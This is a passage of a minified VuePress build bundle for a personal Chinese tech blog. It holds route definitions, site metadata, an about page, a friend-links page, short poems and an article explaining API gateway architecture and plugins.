Back-end/page/4/"},{name:"v-70770135",path:"/categories/后端 Back-end/page/5/",component:Be,beforeEnter:(n,e,t)=>{Object(Gn.a)("Layout","v-70770135").then(t)},meta:{pid:"categories",id:"后端 Back-end"}},{path:"/categories/后端 Back-end/page/5/index.html",redirect:"/categories/后端 Back-end/page/5/"},{name:"v-70770154",path:"/categories/后端 Back-end/page/6/",component:Be,beforeEnter:(n,e,t)=>{Object(Gn.a)("Layout","v-70770154").then(t)},meta:{pid:"categories",id:"后端 Back-end"}},{path:"/categories/后端 Back-end/page/6/index.html",redirect:"/categories/后端 Back-end/page/6/"},{name:"v-70770173",path:"/categories/后端 Back-end/page/7/",component:Be,beforeEnter:(n,e,t)=>{Object(Gn.a)("Layout","v-70770173").then(t)},meta:{pid:"categories",id:"后端 Back-end"}},{path:"/categories/后端 Back-end/page/7/index.html",redirect:"/categories/后端 Back-end/page/7/"},{name:"v-a7aca2d2",path:"/categories/随笔 Essay/page/2/",component:Be,beforeEnter:(n,e,t)=>{Object(Gn.a)("Layout","v-a7aca2d2").then(t)},meta:{pid:"categories",id:"随笔 Essay"}},{path:"/categories/随笔 Essay/page/2/index.html",redirect:"/categories/随笔 Essay/page/2/"},{name:"v-a7aca294",path:"/categories/随笔 Essay/page/3/",component:Be,beforeEnter:(n,e,t)=>{Object(Gn.a)("Layout","v-a7aca294").then(t)},meta:{pid:"categories",id:"随笔 Essay"}},{path:"/categories/随笔 Essay/page/3/index.html",redirect:"/categories/随笔 Essay/page/3/"},{name:"v-b87e4f50",path:"/categories/命理学 Numerology/page/2/",component:Be,beforeEnter:(n,e,t)=>{Object(Gn.a)("Layout","v-b87e4f50").then(t)},meta:{pid:"categories",id:"命理学 Numerology"}},{path:"/categories/命理学 Numerology/page/2/index.html",redirect:"/categories/命理学 Numerology/page/2/"},{name:"v-b87e4f12",path:"/categories/命理学 Numerology/page/3/",component:Be,beforeEnter:(n,e,t)=>{Object(Gn.a)("Layout","v-b87e4f12").then(t)},meta:{pid:"categories",id:"命理学 Numerology"}},{path:"/categories/命理学 Numerology/page/3/index.html",redirect:"/categories/命理学 Numerology/page/3/"},{name:"v-b87e4ed4",path:"/categories/命理学 Numerology/page/4/",component:Be,beforeEnter:(n,e,t)=>{Object(Gn.a)("Layout","v-b87e4ed4").then(t)},meta:{pid:"categories",id:"命理学 Numerology"}},{path:"/categories/命理学 Numerology/page/4/index.html",redirect:"/categories/命理学 Numerology/page/4/"},{path:"*",component:Be}],ze={title:"zの自留地",description:"内在丰盈者，独行亦如众",base:"/",headTags:[["meta",{name:"viewport",content:"width=device-width,initial-scale=1,user-scalable=no"}],["meta",{name:"renderer",content:"webkit"}],["meta",{name:"referrer",content:"never"}],["meta",{"data-draft-node":"block","data-draft-type":"table","data-size":"normal","data-row-style":"normal"}],["link",{rel:"icon",href:"/logo.png"}],["link",{rel:"icon",type:"image/png",sizes:"16x16",href:"/vuepress/favicon-16x16.png"}],["link",{rel:"icon",type:"image/png",sizes:"32x32",href:"/vuepress/favicon-32x32.png"}],["link",{rel:"mask-icon",href:"/vuepress/safari-pinned-tab.svg"}],["link",{rel:"manifest",href:"/manifest.json"}],["link",{rel:"apple-touch-icon",sizes:"57x57",href:"/vuepress/apple-touch-icon-57x57.png"}],["link",{rel:"apple-touch-icon",sizes:"60x60",href:"/vuepress/apple-touch-icon-60x60.png"}],["link",{rel:"apple-touch-icon",sizes:"72x72",href:"/vuepress/apple-touch-icon-72x72.png"}],["link",{rel:"apple-touch-icon",sizes:"76x76",href:"/vuepress/apple-touch-icon-76x76.png"}],["link",{rel:"apple-touch-icon",sizes:"120x120",href:"/vuepress/apple-touch-icon-120x120.png"}],["link",{rel:"apple-touch-icon",sizes:"144x144",href:"/vuepress/apple-touch-icon-144x144.png"}],["link",{rel:"apple-touch-icon",sizes:"152x152",href:"/vuepress/apple-touch-icon-152x152.png"}],["link",{rel:"apple-touch-icon",sizes:"180x180",href:"/vuepress/apple-touch-icon-180x180.png"}],["meta",{name:"apple-mobile-web-app-capable",content:"yes"}],["meta",{name:"apple-mobile-web-app-status-bar-style",content:"black"}],["meta",{name:"msapplication-TileImage",content:"/vuepress/msapplication-icon-144x144.png"}],["meta",{name:"msapplication-TileColor",content:"#000000"}],["script",{language:"javascript",type:"text/javascript",src:"https://cdn.bootcss.com/jquery/3.6.0/jquery.min.js"}],["script",{language:"javascript",type:"text/javascript",src:"/js/MouseClickEffect.js"}]],pages:[{title:"关于我",frontmatter:{title:"关于我",isTimeLine:!1,sidebar:!1,isShowComments:!0},regularPath:"/about/",relativePath:"about/README.md",key:"v-003acffe",path:"/about/",headers:[{level:2,title:"一句话",slug:"一句话",normalizedTitle:"一句话",charIndex:78},{level:2,title:"关于我",slug:"关于我",normalizedTitle:"关于我",charIndex:105},{level:2,title:"兴趣方向",slug:"兴趣方向",normalizedTitle:"兴趣方向",charIndex:133},{level:2,title:"成熟标志",slug:"成熟标志",normalizedTitle:"成熟标志",charIndex:162},{level:2,title:"社区",slug:"社区",normalizedTitle:"社区",charIndex:317},{level:2,title:"部落",slug:"部落",normalizedTitle:"部落",charIndex:403},{level:2,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:928},{level:2,title:"联系",slug:"联系",normalizedTitle:"联系",charIndex:989},{level:2,title:"赞赏（本项目基于znote开发  下方是作者赞赏通道）",slug:"赞赏-本项目基于znote开发-下方是作者赞赏通道",normalizedTitle:"赞赏（本项目基于znote开发  下方是作者赞赏通道）",charIndex:null}],headersStr:"一句话 关于我 兴趣方向 成熟标志 社区 部落 其他 联系 赞赏（本项目基于znote开发  下方是作者赞赏通道）",content:"YOU AND ME\n\n世界上最远的距离，是我在 if 里你在 else 里，虽然经常一起出现，但却永不结伴执行。\n\n来自 North-Glory\n\n\n# 一句话\n\n * 真得学吧？难道真沉淀一辈子？\n\n\n# 关于我\n\n * 一个堪堪入门阶段的技术爱好者！\n\n\n# 兴趣方向\n\n * 前后端开发、网络安全、系统运维\n\n\n# 成熟标志\n\n * 自信乐观，勇于担当，明白责任的意义！\n * 幸福的本质不是“有”，有房有车有钱；而是“无”，无病无灾无烦恼！\n * 意识到自己时间有限，具备区分什么是值得花时间的、什么是不值得花时间的的能力！\n * 成年人的发泄方式，不再是改头像换签名发朋友圈；而是吹吹风，静一静，习惯性等待自愈！\n\n\n# 社区\n\n * 博客：https://north-glory.github.io\n * Github：https://github.com/North-glory/\n\n\n# 部落\n\n * Email：northglory0626@163.com\n * 微信：见下方或 [ 点我直达 ]，记得一定要先看一眼 [ Guide ]\n * 友链：欢迎入队组队🏆 --\x3e [ Let's go! ]\n\nFor you\n\n你若盛开，清风自来。\n\nTo me\n\n心若浮沉，浅笑安然。\n\n- img: /img/other/766d39ee-fbf0-329e-8973-45e90625b579.jpg\n  link: https://www.bilibili.com/video/BV1oG4y1t74F/?spm_id_from=333.337.search-card.all.click&vd_source=34a87cbc6f208f9be80e0c124284d9be\n  name: For you\n  desc: 你若盛开，清风自来。\n- img: /img/other/c33a5027-85d3-3eb4-a785-dd404f674baa.jpg\n  link: /other/friends.html\n  name: To me\n  desc: 心若浮沉，浅笑安然。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 其他\n\n * 本仓库代码使用 MIT 协议进行开源，但是全部文档内容使用 CC 4.0 BY-SA 协议进行发布\n\n\n# 联系\n\n\n\n     \n个人   公众号\n\n\n\n\n# 赞赏（本项目基于znote开发 下方是作者赞赏通道）\n\nThanks for you!",normalizedContent:"you and me\n\n世界上最远的距离，是我在 if 里你在 else 里，虽然经常一起出现，但却永不结伴执行。\n\n来自 north-glory\n\n\n# 一句话\n\n * 真得学吧？难道真沉淀一辈子？\n\n\n# 关于我\n\n * 一个堪堪入门阶段的技术爱好者！\n\n\n# 兴趣方向\n\n * 前后端开发、网络安全、系统运维\n\n\n# 成熟标志\n\n * 自信乐观，勇于担当，明白责任的意义！\n * 幸福的本质不是“有”，有房有车有钱；而是“无”，无病无灾无烦恼！\n * 意识到自己时间有限，具备区分什么是值得花时间的、什么是不值得花时间的的能力！\n * 成年人的发泄方式，不再是改头像换签名发朋友圈；而是吹吹风，静一静，习惯性等待自愈！\n\n\n# 社区\n\n * 博客：https://north-glory.github.io\n * github：https://github.com/north-glory/\n\n\n# 部落\n\n * email：northglory0626@163.com\n * 微信：见下方或 [ 点我直达 ]，记得一定要先看一眼 [ guide ]\n * 友链：欢迎入队组队🏆 --\x3e [ let's go! ]\n\nfor you\n\n你若盛开，清风自来。\n\nto me\n\n心若浮沉，浅笑安然。\n\n- img: /img/other/766d39ee-fbf0-329e-8973-45e90625b579.jpg\n  link: https://www.bilibili.com/video/bv1og4y1t74f/?spm_id_from=333.337.search-card.all.click&vd_source=34a87cbc6f208f9be80e0c124284d9be\n  name: for you\n  desc: 你若盛开，清风自来。\n- img: /img/other/c33a5027-85d3-3eb4-a785-dd404f674baa.jpg\n  link: /other/friends.html\n  name: to me\n  desc: 心若浮沉，浅笑安然。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 其他\n\n * 本仓库代码使用 mit 协议进行开源，但是全部文档内容使用 cc 4.0 by-sa 协议进行发布\n\n\n# 联系\n\n\n\n     \n个人   公众号\n\n\n\n\n# 赞赏（本项目基于znote开发 下方是作者赞赏通道）\n\nthanks for you!",charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"友人帐",frontmatter:{title:"友人帐",sidebar:!0,isShowComments:!0,reward:!0},regularPath:"/other/friends.html",relativePath:"other/friends.md",key:"v-3b912921",path:"/other/friends.html",headers:[{level:3,title:"高质量友人帐",slug:"高质量友人帐",normalizedTitle:"高质量友人帐",charIndex:2},{level:3,title:"友链互换",slug:"友链互换",normalizedTitle:"友链互换",charIndex:2501}],headersStr:"高质量友人帐 友链互换",content:"# 高质量友人帐\n\n * 朋友丰富人生 —— 林肯\n * 展示所有友情站点，排名不分先后！\n * 稍息，立正。欢迎入队！👍\n\n午后南杂\n\nEnjoy when you can, and endure when you must.\n\nzの自留地\n\n内在丰盈者，独行亦如众\n\nEvan's Blog\n\n积跬步以至千里，致敬每个爱学习的你\n\n友人c\n\n只要心还眺\n\n田小波\n\n欢迎访问田小波的技术博客\n\n易良同学的博客\n\n正在努力！\n\n会飞的小弋\n\n喜欢大数据，嵌入式和机器视觉\n\n站位等待中...\n\n稍息，立正。欢迎入队！👍\n\n- name: 午后南杂\n  avatar: https://www.recoluan.com/head.png\n  desc: Enjoy when you can, and endure when you must.\n  link: https://www.recoluan.com\n  bgColor: 'rgb(165 216 243)'\n  textColor: '#6854A1'\n#- name: 青灯有味\n#  desc: 闹里有钱，静外安身。\n#  avatar: https://zscnb.gitee.io/logo.png\n#  link: https://zscnb.gitee.io/\n#  bgColor: '#FCE5BF'\n#  textColor: '#7B2532'\n- name: zの自留地\n  desc: 内在丰盈者，独行亦如众\n  avatar: https://north-glory.github.io/vuepress/head-fish.jpg\n  link: https://north-glory.github.io/\n  bgColor: '#97b8e5'\n  textColor: '#2c3e50'\n#- name: 有梦想的咸鱼\n#  desc: 我不能克制我记几。\n#  avatar: https://blog.liudongyang.top/head-logo.gif\n#  link: https://blog.liudongyang.top\n#  bgColor: '#1abc9c'\n#  textColor: '#c0392b'\n- name: Evan's Blog\n  avatar: https://jsd.cdn.zzko.cn/gh/xugaoyi/image_store/blog/20200103123203.jpg\n  desc: 积跬步以至千里，致敬每个爱学习的你\n  link: https://xugaoyi.com/\n  bgColor: '#2980b9'\n  textColor: '#ecf0f1'\n- name: 友人c\n  avatar: https://www.ihewro.com/usr/uploads/2020/02/863730882.jpg\n  desc: 只要心还眺\n  link: https://www.ihewro.com/\n  bgColor: 'rgb(136,181,214)'\n  textColor: 'rgb(249,249,249)'\n- name: 田小波\n  avatar: https://www.tianxiaobo.com/images/tx.png\n  desc: 欢迎访问田小波的技术博客\n  link: https://www.tianxiaobo.com/\n  bgColor: '#B39CD0'\n  textColor: '#FBEAFF'\n- name: 易良同学的博客\n  desc: 正在努力！\n  avatar: https://yiliang.site/assets/images/avatar.jpg\n  link: https://yiliang.site\n  bgColor: 'rgb(220 218 218)'\n  textColor: '#2c3e50' \n- name: 会飞的小弋\n  link: https://lovelijunyi.gitee.io/\n  avatar: https://gitee.com/lovelijunyi/images/raw/master/20200404135847.jpg\n  desc: 喜欢大数据，嵌入式和机器视觉\n  bgColor: 'rgb(243 126 126)'\n  textColor: 'rgb(102 48 72)'\n- name: 站位等待中...\n  link: \n  avatar: \n  desc: 稍息，立正。欢迎入队！👍\n  bgColor: 'rgb(157 156 186)'\n  textColor: 'rgb(252 249 247)'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\nFor you\n\n你若盛开，清风自来。\n\nTo me\n\n心若浮沉，浅笑安然。\n\n- img: /img/other/5666c8e4-867a-3356-9708-6ba918e87853.jpg\n  link: /other/friends.html\n  name: For you\n  desc: 你若盛开，清风自来。\n- img: /img/other/4ec4e5f0-947b-3abe-9e8b-47bad5b8cf1c.jpg\n  link: /about/index.html\n  name: To me\n  desc: 心若浮沉，浅笑安然。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 友链互换\n\n如需友链，请 联系我 或 留言👇 告知，格式如下：\n\n- name: zの自留地\n  desc: 内在丰盈者，独行亦如众\n  avatar: https://north-glory.github.io/vuepress/head-fish.jpg\n  link: https://north-glory.github.io/\n  bgColor: '#FCDBA0'\n  textColor: '#A05F2C'\n\n\n1\n2\n3\n4\n5\n6\n\n * 颜色仅供参考。\n * 站点要求：内容合法、非营利性。\n * 申请前请记得先添加本站哦～",normalizedContent:"# 高质量友人帐\n\n * 朋友丰富人生 —— 林肯\n * 展示所有友情站点，排名不分先后！\n * 稍息，立正。欢迎入队！👍\n\n午后南杂\n\nenjoy when you can, and endure when you must.\n\nzの自留地\n\n内在丰盈者，独行亦如众\n\nevan's blog\n\n积跬步以至千里，致敬每个爱学习的你\n\n友人c\n\n只要心还眺\n\n田小波\n\n欢迎访问田小波的技术博客\n\n易良同学的博客\n\n正在努力！\n\n会飞的小弋\n\n喜欢大数据，嵌入式和机器视觉\n\n站位等待中...\n\n稍息，立正。欢迎入队！👍\n\n- name: 午后南杂\n  avatar: https://www.recoluan.com/head.png\n  desc: enjoy when you can, and endure when you must.\n  link: https://www.recoluan.com\n  bgcolor: 'rgb(165 216 243)'\n  textcolor: '#6854a1'\n#- name: 青灯有味\n#  desc: 闹里有钱，静外安身。\n#  avatar: https://zscnb.gitee.io/logo.png\n#  link: https://zscnb.gitee.io/\n#  bgcolor: '#fce5bf'\n#  textcolor: '#7b2532'\n- name: zの自留地\n  desc: 内在丰盈者，独行亦如众\n  avatar: https://north-glory.github.io/vuepress/head-fish.jpg\n  link: https://north-glory.github.io/\n  bgcolor: '#97b8e5'\n  textcolor: '#2c3e50'\n#- name: 有梦想的咸鱼\n#  desc: 我不能克制我记几。\n#  avatar: https://blog.liudongyang.top/head-logo.gif\n#  link: https://blog.liudongyang.top\n#  bgcolor: '#1abc9c'\n#  textcolor: '#c0392b'\n- name: evan's blog\n  avatar: https://jsd.cdn.zzko.cn/gh/xugaoyi/image_store/blog/20200103123203.jpg\n  desc: 积跬步以至千里，致敬每个爱学习的你\n  link: https://xugaoyi.com/\n  bgcolor: '#2980b9'\n  textcolor: '#ecf0f1'\n- name: 友人c\n  avatar: https://www.ihewro.com/usr/uploads/2020/02/863730882.jpg\n  desc: 只要心还眺\n  link: https://www.ihewro.com/\n  bgcolor: 'rgb(136,181,214)'\n  textcolor: 'rgb(249,249,249)'\n- name: 田小波\n  avatar: https://www.tianxiaobo.com/images/tx.png\n  desc: 欢迎访问田小波的技术博客\n  link: https://www.tianxiaobo.com/\n  bgcolor: '#b39cd0'\n  textcolor: '#fbeaff'\n- name: 易良同学的博客\n  desc: 正在努力！\n  avatar: https://yiliang.site/assets/images/avatar.jpg\n  link: https://yiliang.site\n  bgcolor: 'rgb(220 218 218)'\n  textcolor: '#2c3e50' \n- name: 会飞的小弋\n  link: https://lovelijunyi.gitee.io/\n  avatar: https://gitee.com/lovelijunyi/images/raw/master/20200404135847.jpg\n  desc: 喜欢大数据，嵌入式和机器视觉\n  bgcolor: 'rgb(243 126 126)'\n  textcolor: 'rgb(102 48 72)'\n- name: 站位等待中...\n  link: \n  avatar: \n  desc: 稍息，立正。欢迎入队！👍\n  bgcolor: 'rgb(157 156 186)'\n  textcolor: 'rgb(252 249 247)'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\nfor you\n\n你若盛开，清风自来。\n\nto me\n\n心若浮沉，浅笑安然。\n\n- img: /img/other/5666c8e4-867a-3356-9708-6ba918e87853.jpg\n  link: /other/friends.html\n  name: for you\n  desc: 你若盛开，清风自来。\n- img: /img/other/4ec4e5f0-947b-3abe-9e8b-47bad5b8cf1c.jpg\n  link: /about/index.html\n  name: to me\n  desc: 心若浮沉，浅笑安然。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 友链互换\n\n如需友链，请 联系我 或 留言👇 告知，格式如下：\n\n- name: zの自留地\n  desc: 内在丰盈者，独行亦如众\n  avatar: https://north-glory.github.io/vuepress/head-fish.jpg\n  link: https://north-glory.github.io/\n  bgcolor: '#fcdba0'\n  textcolor: '#a05f2c'\n\n\n1\n2\n3\n4\n5\n6\n\n * 颜色仅供参考。\n * 站点要求：内容合法、非营利性。\n * 申请前请记得先添加本站哦～",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Home",frontmatter:{home:!0,heroImage:"/vuepress/index-read.gif",faceImage:"/vuepress/head.png",heroImageStyle:{maxWidth:"520px",width:"100%",display:"block",margin:"3% auto","box-shadow":"8px 8px 20px #022",borderRadius:"10px"},isShowTitleInHome:!0,actionText:"开启进阶之路",actionLink:"/views/",features:[{title:null,details:"把所有的不快给昨天"},{title:null,details:"把所有的努力给今天"},{title:null,details:"把所有的希望给明天"}],footer:"MIT Licensed | Copyright © 2018-present Evan You"},regularPath:"/",relativePath:"README.md",key:"v-c8af1a66",path:"/",headersStr:null,content:"人的一生能有几天\n\n问一问，人的一生能有几天\n算一算，人的一生不过三天\n\n\n跑过去的是昨天\n奔过来的是明天\n正在走的是今天\n\n\n不要忘记昨天\n认真计划明天\n好好把握今天\n\n\n但愿到了明天\n今天已成昨天\n而你依然在我身边\n\n\n啊。\n春梦无痕，秋夜缠绵\n如歌岁月，似水流年\n\n\n但愿到了明天\n今天已成昨天\n而我依然在你心间",normalizedContent:"人的一生能有几天\n\n问一问，人的一生能有几天\n算一算，人的一生不过三天\n\n\n跑过去的是昨天\n奔过来的是明天\n正在走的是今天\n\n\n不要忘记昨天\n认真计划明天\n好好把握今天\n\n\n但愿到了明天\n今天已成昨天\n而你依然在我身边\n\n\n啊。\n春梦无痕，秋夜缠绵\n如歌岁月，似水流年\n\n\n但愿到了明天\n今天已成昨天\n而我依然在你心间",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{frontmatter:{sidebar:!1,isComment:!1,isShowReward:!1,layout:"Projects"},regularPath:"/other/project.html",relativePath:"other/project.md",key:"v-17947ebe",path:"/other/project.html",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"概览",frontmatter:{title:"概览",sidebar:!0,date:"2019-08-21T00:00:00.000Z",sidebarDepth:0,isShowComments:!0,next:"backend/spring-source-01"},regularPath:"/views/",relativePath:"views/README.md",key:"v-50063c7c",path:"/views/",headersStr:null,content:" \n \n \n远航\n \n昂然踏着前路去\n追赶理想旅途上\n前行步步怀自信\n风吹雨打不退让\n \n无论我去到哪方\n心里梦想不变样\n是新生 是醒觉\n梦想永远在世上\n \n前路哪怕远 只要自强\n我继续独自寻路向\n常为以往梦想发狂\n耐心摸索路途上\n \n怀自信 我永不怕夜航\n到困倦我自弹自唱\n掌声我向梦想里寻\n尽管一切是狂想\n \n途人路上回望我\n只因我的怪模样\n途人谁能明白我\n今天眼睛多雪亮\n \n人是各有各理想\n奔向目标不退让\n用歌声 用欢笑\n来博知音的赞赏\n \n怀自信 我永不怕夜航\n到困倦我自弹自唱\n掌声我向梦想里寻\n尽管一切是狂想\n \n昂然踏着前路去\n追赶理想旅途上\n前行步步怀自信\n依照心中那 正确方向\n \n怀着爱与恕的心\n充满梦想的笑着\n用歌声 用欢笑\n来博知音的赞赏\n \n\n【分类】\n\n【标签】\n\n【前端】 | 【后端】\n\n【规范】 | 【随笔】",normalizedContent:" \n \n \n远航\n \n昂然踏着前路去\n追赶理想旅途上\n前行步步怀自信\n风吹雨打不退让\n \n无论我去到哪方\n心里梦想不变样\n是新生 是醒觉\n梦想永远在世上\n \n前路哪怕远 只要自强\n我继续独自寻路向\n常为以往梦想发狂\n耐心摸索路途上\n \n怀自信 我永不怕夜航\n到困倦我自弹自唱\n掌声我向梦想里寻\n尽管一切是狂想\n \n途人路上回望我\n只因我的怪模样\n途人谁能明白我\n今天眼睛多雪亮\n \n人是各有各理想\n奔向目标不退让\n用歌声 用欢笑\n来博知音的赞赏\n \n怀自信 我永不怕夜航\n到困倦我自弹自唱\n掌声我向梦想里寻\n尽管一切是狂想\n \n昂然踏着前路去\n追赶理想旅途上\n前行步步怀自信\n依照心中那 正确方向\n \n怀着爱与恕的心\n充满梦想的笑着\n用歌声 用欢笑\n来博知音的赞赏\n \n\n【分类】\n\n【标签】\n\n【前端】 | 【后端】\n\n【规范】 | 【随笔】",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"API 网关概述",frontmatter:{title:"API 网关概述",date:"2022-04-16T00:00:00.000Z",tags:["分布式","网关"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/API%E7%BD%91%E5%85%B3%E6%A6%82%E8%BF%B0.html",relativePath:"views/backend/API网关概述.md",key:"v-9d87f17e",path:"/views/backend/API%E7%BD%91%E5%85%B3%E6%A6%82%E8%BF%B0.html",headers:[{level:2,title:"何为API网关",slug:"何为api网关",normalizedTitle:"何为api网关",charIndex:94},{level:2,title:"API网关架构",slug:"api网关架构",normalizedTitle:"api网关架构",charIndex:105},{level:2,title:"Gateway核心设计",slug:"gateway核心设计",normalizedTitle:"gateway核心设计",charIndex:116},{level:2,title:"API网关基本功能",slug:"api网关基本功能",normalizedTitle:"api网关基本功能",charIndex:131},{level:2,title:"插件列表",slug:"插件列表",normalizedTitle:"插件列表",charIndex:144},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:152}],excerpt:"<Boxx/>\n<p>API网关是一个聚合多个不同API的统一出口，同时对API进行流量控制/统计、身份校验、报文转换等操作。</p>\n<p>API网关和API的区别主要在于一个是聚合工具，一个是实际干活的。</p>\n",headersStr:"何为API网关 API网关架构 Gateway核心设计 API网关基本功能 插件列表 参考",content:"API网关是一个聚合多个不同API的统一出口，同时对API进行流量控制/统计、身份校验、报文转换等操作。\n\nAPI网关和API的区别主要在于一个是聚合工具，一个是实际干活的。\n\n\n\n * 何为API网关\n * API网关架构\n * Gateway核心设计\n * API网关基本功能\n * 插件列表\n * 参考\n\n\n\n\n# 何为API网关\n\n\n\n根据目前所在的自研网关架构项目组，简单点举个例子：\n\n * API网关地址 https://www.znote.openapi.com\n\n * 有3个API：\n   \n   a. 订单接口 https://www.aaa.com/aaaOrder\n   b. 商品接口 https://www.bbb.com/bbbGoods\n   c. 促销接口 https://www.ccc.com/cccPromotion\n   \n\n未接入API网关前：系统需要暴露 a、b、c 3个接口地址，客户方调用\n\n接入API网关后：系统只需暴露网关地址 https://www.znote.openapi.com 即可，客户方根据SDK调用不同接口，同时API网关还可对已接入的API进行参数转换、流控、权限、监控等一系列管理操作。\n\n看到上面的图示与描述，我们可能会想到另外一个与网关类似的东西——代理。网关与代理的区别：代理是纯粹的数据透传，协议不会发生变化；网关在数据透传的背景下，还会设计协议的转换，比如上图中用户请求传输到网关的协议是HTTP，通过网关透传到下游则可能已经转换成企业内部的RPC了（比如JSF、Dubbo等企业自研的RPC框架）。\n\n\n# API网关架构\n\n在一个大型微服务网络中，大概架构分为几层：\n\n 1. 渠道层 接受客户端请求和各种协议等\n 2. 场景层 是否直连，是否走F5，是否走网关\n 3. 接入层 f5，安全网关，API网关等\n 4. 集成层 集中管理，rpc远程调用\n 5. 服务层 各业务逻辑分页、缓存等\n 6. 产品层 各服务分片\n\nAPI网关处于接入层角色，具有承上启下的作用，承担着报文转换、参数处理、协议适配、权限管理、监控告警等一系列重要角色信息。\n\n内部网关架构不宜分享，但以开源的 Soul 网关为例：\n\n\n\n涵盖有：Admin管理中心、zk配置中心和Gateway三部分组成。\n\n * Admin管理中心：统一管理接入API网关的接口\n\n * zk配置中心：经Admin管理中心配置好数据后，由zk负责完成网关的同步信息，保证网关的高可用，承担着网关数据源的角色\n\n * Gateway：由Netty实现，基于异步的、事件驱动的、高性能、高并发解决方案\n\n\n# Gateway核心设计\n\nAPI网关基本请求流程：\n\n 1. 确定API映射关系和参数协议报文等要素，通过Admin管理中心接入API网关\n 2. 在Admin管理中心对接口进行场景绑定、应用绑定、授权上线同步zk配置中心，接入网关\n 3. API网关下发SDK和公私钥、APP_ID等文件，客户方引入SDK加密加签调用相应接口\n 4. 给客户方开通权限，客户方联调，上送请求报文，请求报文流转于Gateway中\n\n\n\nGateway基于Netty Pipeline Handler的处理模式，以 过滤链 + 插件化 的方式将请求流转于Gateway，进一步对请求进行解密验签、参数转换、限流熔断、权限过滤等不同功能处理。\n\n同时可针对不同场景、不同功能做出不同的定制化插件开发。\n\n\n# API网关基本功能\n\nAPI管理：基于Admin管理中心进行接口的配置、上线、关系绑定等。\n\n参数处理：基于Admin管理中心对参数进行映射处理（如将真实入参requestId暴露为req_id）；对参数进行动态绑定、对参数进行合理化输出等。\n\n动态配置：基于Admin管理中心对接口进行系统化操作后，基于zk配置中心实现热部署式接口上线、更新、发布等操作。\n\n定制化插件：Gateway支持通过插件的形式对网关请求做出不同功能。\n\n\n# 插件列表\n\n请求头转换插件：可对请求头和响应头进行配置化定制\n\n鉴权配置插件：支持JWT和OAUTH2鉴权和自定义Jar鉴权\n\n限流配置插件：使用分布式令牌桶的形式对每个服务进行差别化限流\n\n熔断降级配置插件：使用resilience4j来进行熔断降级，如果后端服务有异常处理，可以进行降级\n\n请求报文校验插件：采用json schema对报文体或部分报文体的格式校验\n\nGroovy脚本插件：可动态在调用链中插入一段java脚本，来执行需要的逻辑\n\nMock插件：mock请求结果，配置该插件后，请求不会再转发给后端服务，根据配置好的freemarker模板直接响应给调用方\n\nRpc路由转换插件：配置将http请求转化为dubbo请求时需要的参数，如服务名，参数转化逻辑\n\nUrl重写插件：该插件可对Tesla请求到后端的url进行差异化配置，支持直接转发和占位符转发\n\n创建token插件：可根据响应报文内容抽取参数后生成JWT\n\n执行上传jar包插件：如果有特殊化的功能，当前插件体系无法满足时，可以使用该插件自己编写逻辑\n\n查询聚合插件：该插件可实现调用方一次查询，聚合多个后端接口数据的效果\n\n消除鉴权插件：该插件用于当API的鉴权类型不是开放时，但个别endpoint不希望鉴权时使用，如/login，/logout等\n\n缓存结果插件：该插件可根据配置缓存请求结果\n\n请求报文转换插件：该插件根据配置的freemarker脚本对请求体和响应体的报文进行转换\n\n支持自定义插件。\n\n\n# 参考\n\nhttps://gitee.com/mirrors/soul\n\nhttps://github.com/jiangjunwei/tesla\n\nhttps://www.jianshu.com/p/7baab672b822",normalizedContent:"api网关是一个聚合多个不同api的统一出口，同时对api进行流量控制/统计、身份校验、报文转换等操作。\n\napi网关和api的区别主要在于一个是聚合工具，一个是实际干活的。\n\n\n\n * 何为api网关\n * api网关架构\n * gateway核心设计\n * api网关基本功能\n * 插件列表\n * 参考\n\n\n\n\n# 何为api网关\n\n\n\n根据目前所在的自研网关架构项目组，简单点举个例子：\n\n * api网关地址 https://www.znote.openapi.com\n\n * 有3个api：\n   \n   a. 订单接口 https://www.aaa.com/aaaorder\n   b. 商品接口 https://www.bbb.com/bbbgoods\n   c. 促销接口 https://www.ccc.com/cccpromotion\n   \n\n未接入api网关前：系统需要暴露 a、b、c 3个接口地址，客户方调用\n\n接入api网关后：系统只需暴露网关地址 https://www.znote.openapi.com 即可，客户方根据sdk调用不同接口，同时api网关还可对已接入的api进行参数转换、流控、权限、监控等一系列管理操作。\n\n看到上面的图示与描述，我们可能会想到另外一个与网关类似的东西——代理。网关与代理的区别：代理是纯粹的数据透传，协议不会发生变化；网关在数据透传的背景下，还会设计协议的转换，比如上图中用户请求传输到网关的协议是http，通过网关透传到下游则可能已经转换成企业内部的rpc了（比如jsf、dubbo等企业自研的rpc框架）。\n\n\n# api网关架构\n\n在一个大型微服务网络中，大概架构分为几层：\n\n 1. 渠道层 接受客户端请求和各种协议等\n 2. 场景层 是否直连，是否走f5，是否走网关\n 3. 接入层 f5，安全网关，api网关等\n 4. 集成层 集中管理，rpc远程调用\n 5. 服务层 各业务逻辑分页、缓存等\n 6. 产品层 